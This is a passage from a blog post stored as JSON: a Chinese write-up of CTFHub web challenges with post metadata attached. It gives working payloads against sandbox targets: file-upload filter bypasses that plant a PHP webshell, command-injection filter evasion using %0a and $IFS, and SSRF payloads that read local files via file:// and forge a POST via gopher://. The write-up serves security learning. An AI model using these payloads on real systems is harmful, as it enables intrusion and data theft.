punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string\">\"文件类型不匹配\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">--</span><span class=\"token operator\">></span>\n</code></pre>\n<p><code>move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;],$des)</code>这个函数就是把上传文件放到<code>$des</code>的路径上并且改了文件名</p>\n<p>所以我们不能让后面的<code>rand()</code>和<code>date()</code>运行，所以对于变量<code>road</code>【也就是开始讲到的】，就需要在它后面加上一个<code>%00</code>截断后面的语句</p>\n<p>也就是下面这个请求头后面</p>\n<p><img src=\"/post/wp-CTFHub/image-20220731233456720.png\" alt=\"image-20220731233456720\"></p>\n<p>图片正常上传就可以，这就是把图片内容上传到<code>1.php</code>文件中，这样虽然我们上传的是一个图片，但实际上，我们上传了一个名为<code>1.php</code>的一句话木马</p>\n<p>【名字不重要，虽然图片和<code>php</code>文件名一样，这里<code>1.php</code>是随便取得，主要蚁剑连接的就是它】</p>\n<p><img src=\"/post/wp-CTFHub/image-20220731233716114.png\"></p>\n<p>用蚁剑连接<code>url/upload/1.php</code></p>\n<p>得到<code>flag</code></p>\n<h2 id=\"10-文件上传-双写后缀\"><a href=\"#10-文件上传-双写后缀\" class=\"headerlink\" title=\"10.文件上传-双写后缀\"></a>10.文件上传-双写后缀</h2><p>进行了一次过滤php后缀名，双写php为p<u>php</u>hp，这样当过滤了__的php，剩下的仍然是php，正常用蚁剑连接</p>\n<p><img src=\"/post/wp-CTFHub/image-20220731165549883.png\" alt=\"image-20220731165549883\"></p>\n<p><img src=\"/post/wp-CTFHub/image-20220731165841829.png\" alt=\"image-20220731165841829\"></p>\n<p>得到flag</p>\n<h2 id=\"11-RCE-命令注入-综合训练\"><a href=\"#11-RCE-命令注入-综合训练\" class=\"headerlink\" title=\"11.RCE-命令注入-综合训练\"></a>11.RCE-命令注入-综合训练</h2><pre class=\" language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span>\n\n<span class=\"token variable\">$res</span> <span class=\"token operator\">=</span> <span class=\"token constant\">FALSE</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'ip'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'ip'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$ip</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'ip'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$m</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/(\\||&amp;|;| |\\/|cat|flag|ctfhub)/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$ip</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$m</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$cmd</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"ping -c 4 {;$ip};\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$res</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$res</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$m</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter\">?></span>\n</code></pre>\n<p>这道题</p>\n<p>看到<code>|，;，&amp;</code>都被过滤了</p>\n<p>那么可以用<code>%0a</code>也是换行符代替</p>\n<p>空格，&#x2F;，cat，flag，ctfhub（这些好像不大用的上，没关系）</p>\n<p><code>$IFS</code>代替<code>空格</code>，<code>cat</code>可以用<code>more</code>代替，<code>%09</code>代替<code>TAB</code>键，用来补全<code>flag</code></p>\n<p><code>?ip=120.0.0.1%0als</code></p>\n<p><img src=\"/post/wp-CTFHub/image-20220801215911504.png\" alt=\"image-20220801215911504\"></p>\n<p>然后</p>\n<p><code>?ip=120.0.0.1%0acd$IFS%09*_is_here%0als</code></p>\n<p><img src=\"/post/wp-CTFHub/image-20220801215930160.png\" alt=\"image-20220801215930160\"></p>\n<p>后面就简单了</p>\n<p><code>?ip=120.0.0.1%0acd$IFS%09*_is_here%0amore$IFS%09*24135173615424.php</code></p>\n<p>右键查看源码</p>\n<p>得到<code>flag</code></p>\n<h2 id=\"12-SSRF-内网访问\"><a href=\"#12-SSRF-内网访问\" class=\"headerlink\" title=\"12.SSRF-内网访问\"></a>12.SSRF-内网访问</h2><p><img src=\"/post/wp-CTFHub/image-20220802103546644.png\" alt=\"image-20220802103546644\"></p>\n<p><img src=\"/post/wp-CTFHub/image-20220802103603770.png\" alt=\"image-20220802103603770\"></p>\n<p>所以构造payload</p>\n<p><code>http://challenge-c0c40a8ea91b3909.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php</code></p>\n<p>得到flag</p>\n<h2 id=\"13-SSRF-伪协议读取文件\"><a href=\"#13-SSRF-伪协议读取文件\" class=\"headerlink\" title=\"13.SSRF-伪协议读取文件\"></a>13.SSRF-伪协议读取文件</h2><h3 id=\"伪协议\"><a href=\"#伪协议\" class=\"headerlink\" title=\"伪协议\"></a>伪协议</h3><p>事实上是其支持的协议与封装协议。而其支持的部分协议有：</p>\n<pre><code>    file:// — 访问本地文件系统\n\n    http:// — 访问 HTTP(s) 网址\n\n    ftp:// — 访问 FTP(s) URLs\n\n    php:// — 访问各个输入/输出流(I/O streams)\n</code></pre>\n<p>根据提示，flag在Web目录下，Web目录一般是在<code>/var/www/html/</code>下</p>\n<p><code>http://challenge-5c45d983b45e22b7.sandbox.ctfhub.com:10800/?url=file:///var/www/html/flag.php</code></p>\n<p>得到flag</p>\n<h2 id=\"14-SSRF-端口扫描\"><a href=\"#14-SSRF-端口扫描\" class=\"headerlink\" title=\"14.SSRF-端口扫描\"></a>14.SSRF-端口扫描</h2><p>端口扫描，那就利用爆破，从8000到9000扫一遍，看看flag在哪个端口下</p>\n<p><code>http://challenge-30d6aa92f511ee1f.sandbox.ctfhub.com:10800/?url=127.0.0.1:8000</code></p>\n<p><img src=\"/post/wp-CTFHub/image-20220802105640721.png\" alt=\"image-20220802105640721\"></p>\n<p>看到长度不同，打开查看响应数据包</p>\n<p>得到flag</p>\n<h2 id=\"15-SSRF-POST请求\"><a href=\"#15-SSRF-POST请求\" class=\"headerlink\" title=\"15.SSRF-POST请求\"></a>15.SSRF-POST请求</h2><p><code>hint：这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年</code></p>\n<p>开始是一个空白页面</p>\n<p>网站为</p>\n<pre><code>http://challenge-177dcd6de76352cb.sandbox.ctfhub.com:10800/?url=_\n</code></pre>\n<p>我们在其后面加上<code>127.0.0.1/flag.php</code>看看能不能直接访问该文件</p>\n<pre><code>http://challenge-177dcd6de76352cb.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php\n</code></pre>\n<p><img src=\"/post/wp-CTFHub/image-20220925221703912.png\" alt=\"image-20220925221703912\"></p>\n<p>发现出现了一个输入框</p>\n<p><code>F12</code>查看源码：</p>\n<pre class=\" language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">action</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>/flag.php<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">method</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>post<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>key<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token comment\" spellcheck=\"true\">&lt;!-- Debug: key=11e053e2b7900523ac51fc7606b964e2--></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">></span></span>\n</code></pre>\n<p>发现了一个<code>key</code>的参数</p>\n<pre><code>key=11e053e2b7900523ac51fc7606b964e2\n//key是不定的哈，不要全copy\n</code></pre>\n<p>我们把<code>key</code>值输入框中试试</p>\n<p><img src=\"/post/wp-CTFHub/image-20220925222739689.png\" alt=\"image-20220925222739689\"></p>\n<p>看来只能从本地<code>127.0.0.1</code>访问</p>\n<p>利用<code>file://</code>伪协议从本地方式访问文件看看<code>index.php</code>文件</p>\n<pre><code>http://challenge-177dcd6de76352cb.sandbox.ctfhub.com:10800/?url=file:///var/www/html/index.php\n</code></pre>\n<p>右键查看，</p>\n<p>得到<code>index.php</code>源码</p>\n<pre class=\" language-php\"><code class=\"language-php\"> <span class=\"token delimiter\">&lt;?php</span>\n\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string\">'url'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Location: /?url=_\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    exit<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$ch</span> <span class=\"token operator\">=</span> <span class=\"token function\">curl_init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_URL</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string\">'url'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_HEADER</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_FOLLOWLOCATION</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">curl_exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">curl_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p>以相同方式看看<code>flag.php</code>文件</p>\n<pre class=\" language-php+HTML\"><code class=\"language-php+HTML\"><?php\n\nerror_reporting(0);\n\nif ($_SERVER[\"REMOTE_ADDR\"] != \"127.0.0.1\") {;\n    echo \"Just View From 127.0.0.1\";\n    return;\n};\n\n$flag=getenv(\"CTFHUB\");\n$key = md5($flag);\n\nif (isset($_POST[\"key\"]) && $_POST[\"key\"] == $key) {;\n    echo $flag;\n    exit;\n};\n?>\n\n<form action=\"/flag.php\" method=\"post\">\n<input type=\"text\" name=\"key\">\n<!-- Debug: key=<?php echo $key;?>-->\n</form>\n</code></pre>\n<p>根据<code>flag.php</code>最后的提示，</p>\n<p>尝试 <code>Gopher</code> 协议向服务器发送 <code>POST</code> 包</p>\n<pre><code> Gopher协议的格式:\n \n gopher://IP:port/_TCP/IP数据流\n</code></pre>\n<p>先构造 <code>Gopher</code>协议所需的 <code>POST</code>请求：</p>\n<pre><code>POST /flag.php HTTP/1.1\nHost: 127.0.0.1:80\nContent-Length: 36          \nContent-Type: application/x-www-form-urlencoded\n\nkey=11e053e2b7900523ac51fc7606b964e2\n\n//Content-Length 这个要和底下POST参数[包括key=,4个]长度一致\n</code></pre>\n<p>但是这里需要对其进行两次<code>url</code>编码</p>\n<p>根据<code>hint</code>，请求有<code>curl</code>功能</p>\n<p>在向服务器发送请求时，首先浏览器会进行一次 <code>URL</code>解码，</p>\n<p>其次服务器收到请求后，在执行<code>curl</code>功能时，进行第二次 <code>URL</code>解码</p>\n<p>因此需要两次<code>url</code>编码</p>\n<pre><code>`注`：\n在第一次编码后的数据中，将`%0A`全部替换为`%0D%0A`。\n\n因为 Gopher协议包含的请求数据包中，可能包含有`=`、`&amp;`等特殊字符，\n避免与服务器解析传入的参数键值对混淆，所以对数据包进行 URL编码，这样服务端会把`%`后的字节当做普通字节。\n</code></pre>\n<p><img src=\"/post/wp-CTFHub/image-20220925231951671.png\" alt=\"image-20220925231951671\"></p>\n<p>然后第二次编码</p>\n<p><img src=\"/post/wp-CTFHub/image-20220925232013164.png\" alt=\"image-20220925232013164\"></p>\n<p>得到</p>\n<pre><code>POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Length%253A%252036%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250A%250D%250Akey%253D11e053e2b7900523ac51fc7606b964e2\n</code></pre>\n<p>然后又因为<code>flag.php</code>里有<code>$_SERVER[&quot;REMOTE_ADDR&quot;]</code></p>\n<pre class=\" language-php\"><code class=\"language-php\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"REMOTE_ADDR\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token string\">\"127.0.0.1\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string\">\"Just View From 127.0.0.1\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p>如果直接在输入框，上传POST请求又会显示</p>\n<p><img src=\"/post/wp-CTFHub/image-20220925222739689.png\" alt=\"image-20220925222739689\"></p>\n<p>这个想绕过，就只有通过<code>index.php</code>的<code>curl</code>功能，利用Gopher协议从<code>127.0.0.1</code>向目标发送<code>POST</code>请求</p>\n<pre><code>?url=gopher://127.0.0.1:80/_POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Length%253A%252036%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250A%250D%250Akey%253D11e053e2b7900523ac51fc7606b964e2\n</code></pre>\n<p><img src=\"/post/wp-CTFHub/image-20220925232055769.png\" alt=\"image-20220925232055769\"></p>\n<p>得到flag</p>\n","text":"做做笔记 WEB1.密码口令1）弱口令一般思维， 用户名：admin，root 密码：password，admin123，123456 可以用top100字典（...","permalink":"/post/wp-CTFHub","photos":[],"count_time":{"symbolsCount":"13k","symbolsTime":"11 mins."},"categories":[{"name":"网络安全学习","slug":"网络安全学习","count":26,"path":"api/categories/网络安全学习.json"}],"tags":[{"name":"靶场","slug":"靶场","count":5,"path":"api/tags/靶场.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#WEB\"><span class=\"toc-text\">WEB</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#1-%E5%AF%86%E7%A0%81%E5%8F%A3%E4%BB%A4\"><span class=\"toc-text\">1.密码口令</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1%EF%BC%89%E5%BC%B1%E5%8F%A3%E4%BB%A4\"><span class=\"toc-text\">1）弱口令</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2%EF%BC%89%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4\"><span class=\"toc-text\">2）默认口令</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#2-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD\"><span class=\"toc-text\">2.信息泄露-备份文件下载</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#2-1-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-robots-txt\"><span class=\"toc-text\">2.1 信息泄露-robots.txt</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#2-2-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-bak%E6%96%87%E4%BB%B6\"><span class=\"toc-text\">2.2 信息泄露-bak文件</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#2-3-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-vim%E7%BC%93%E5%AD%98\"><span class=\"toc-text\">2.3 信息泄露-vim缓存</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">原理</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8\"><span class=\"toc-text\">如何利用</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#2-4-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-DS-Store\"><span class=\"toc-text\">2.4 信息泄露-.DS_Store</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#3-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2-log\"><span class=\"toc-text\">3.信息泄露-Git泄露-log</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">工作原理</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BC%98%E7%82%B9\"><span class=\"toc-text\">优点</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%94%A8%E6%B3%95%E7%A4%BA%E4%BE%8B\"><span class=\"toc-text\">用法示例</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#4-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2-Stash\"><span class=\"toc-text\">4.信息泄露-Git泄露-Stash</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#git-stash-%E7%9A%84%E4%BD%9C%E7%94%A8\"><span class=\"toc-text\">git stash 的作用</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#5-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-SVN%E6%B3%84%E9%9C%B2\"><span class=\"toc-text\">5.信息泄露-SVN泄露</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#6-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-HG%E6%B3%84%E9%9C%B2\"><span class=\"toc-text\">6.信息泄露-HG泄露</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#7-xss-xss%E5%8F%8D%E5%B0%84%E5%9E%8B\"><span class=\"toc-text\">7.xss-xss反射型</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#8-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A3%80%E6%9F%A5\"><span class=\"toc-text\">8.文件上传-文件头检查</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#9-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-00%E6%88%AA%E6%96%AD\"><span class=\"toc-text\">9.文件上传-00截断</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x00%E6%88%AA%E6%96%AD%E5%8E%9F%E7%90%86%EF%BC%9A-php\"><span class=\"toc-text\">0x00截断原理：[php&lt;5.3.29]</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#10-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E5%8F%8C%E5%86%99%E5%90%8E%E7%BC%80\"><span class=\"toc-text\">10.文件上传-双写后缀</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#11-RCE-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-%E7%BB%BC%E5%90%88%E8%AE%AD%E7%BB%83\"><span class=\"toc-text\">11.RCE-命令注入-综合训练</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#12-SSRF-%E5%86%85%E7%BD%91%E8%AE%BF%E9%97%AE\"><span class=\"toc-text\">12.SSRF-内网访问</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#13-SSRF-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6\"><span class=\"toc-text\">13.SSRF-伪协议读取文件</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BC%AA%E5%8D%8F%E8%AE%AE\"><span class=\"toc-text\">伪协议</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#14-SSRF-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F\"><span class=\"toc-text\">14.SSRF-端口扫描</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#15-SSRF-POST%E8%AF%B7%E6%B1%82\"><span class=\"toc-text\">15.SSRF-POST请求</span></a></li></ol></li></ol>","author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"Vulnhub靶场学习笔记","uid":"491300d0cef38ffb8ad393b16508579e","slug":"vulnhub","date":"2022-08-29T07:06:05.187Z","updated":"2023-08-06T08:01:01.385Z","comments":true,"path":"api/articles/vulnhub.json","keywords":null,"cover":"/img/30.jpg","text":"学习一下实战靶场，做一下笔记 实战环境， 信息收集的能力决定了能否渗透成功，以及自己会浪费自己多少时间 前言官网下载地址 http://www.vulnhub....","permalink":"/post/vulnhub","photos":[],"count_time":{"symbolsCount":"60k","symbolsTime":"55 mins."},"categories":[{"name":"网络安全学习","slug":"网络安全学习","count":26,"path":"api/categories/网络安全学习.json"}],"tags":[{"name":"靶场","slug":"靶场","count":5,"path":"api/tags/靶场.json"}],"author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"加密密文特征","uid":"925fed3a18c07a3de0254ce9178a9827","slug":"Encrypted-ciphertext-features","date":"2022-07-21T09:45:54.374Z","updated":"2023-08-06T07:35:24.468Z","comments":true,"path":"api/articles/Encrypted-ciphertext-features.json","keywords":null,"cover":"/img/6.jpg","text":"原文链接 1、MD5——示例21232F297A57A5A743894A0E4A801FC3 一般MD5值是32位由数字0-9和字母a-f所组成的字符串，如图。...","permalink":"/post/Encrypted-ciphertext-features","photos":[],"count_time":{"symbolsCount":"6k","symbolsTime":"5 mins."},"categories":[{"name":"网络安全学习","slug":"网络安全学习","count":26,"path":"api/categories/网络安全学习.json"}],"tags":[{"name":"crypto&misc","slug":"crypto-misc","count":2,"path":"api/tags/crypto-misc.json"}],"author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}